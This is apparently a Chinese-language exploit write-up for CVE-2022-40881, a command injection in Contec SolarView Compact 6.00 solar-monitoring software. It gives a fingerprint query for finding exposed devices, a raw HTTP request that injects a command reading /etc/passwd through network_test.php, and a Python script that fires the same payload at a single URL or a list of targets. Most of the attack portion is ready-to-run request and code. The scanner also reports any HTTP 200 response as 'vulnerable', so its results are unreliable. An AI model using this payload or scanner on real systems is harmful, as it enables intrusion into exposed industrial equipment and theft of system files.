# SolarView Compact 命令注入漏洞 CVE-2022-40881

## 漏洞描述

Contec SolarView Compact是日本Contec公司的一个应用系统。提供光伏发电测量系统。Contec SolarView Compact 6.00版本存在安全漏洞，攻击者利用该漏洞可以通过 network_test.php 的命令注入攻击。

## 漏洞影响

```
SolarView Compact 6.00
```

## 网络测绘

```
body="SolarView Compact" && title=="Top"
```

## 漏洞复现

发送数据包：

```
POST /cgi-bin/network_test.php HTTP/1.1
Host: x.x.x.x
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

host=%0acat${IFS}/etc/passwd%0a&command=ping
```

## 漏洞POC

```python
import sys
import requests
import argparse

def poc_scan(url):
    try:
        url = url + "/network_test.php"
        response = requests.post(url,data = "host=%0acat${IFS}/etc/passwd%0a&command=ping",timeout=2)
        if response.status_code == 200:
            print(f"\033[92m[+] {url} is vulnerable!\033[0m")
        else:
            print(f"\033[31m[-] {url} is not vulnerable!\033[0m")
    except:
        pass


def open_file(filename):
    with open(filename, 'r', encoding='utf-8') as f:
        filecontent = f.read()
    return filecontent

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url")
    parser.add_argument("-f", "--file")
    args = parser.parse_args()
    url = args.url
    filename = args.file

    if sys.argv[1] == '-u':
        poc_scan(url)
    else:
        filecontent = open_file(filename)
        filecontent = filecontent.split("\n")
        for i in filecontent:
            poc_scan(i)
```

## 修复建议

目前厂商已发布升级补丁以修复漏洞，补丁获取链接：https://www.contec.com/products-services/environmental-monitoring/solarview/

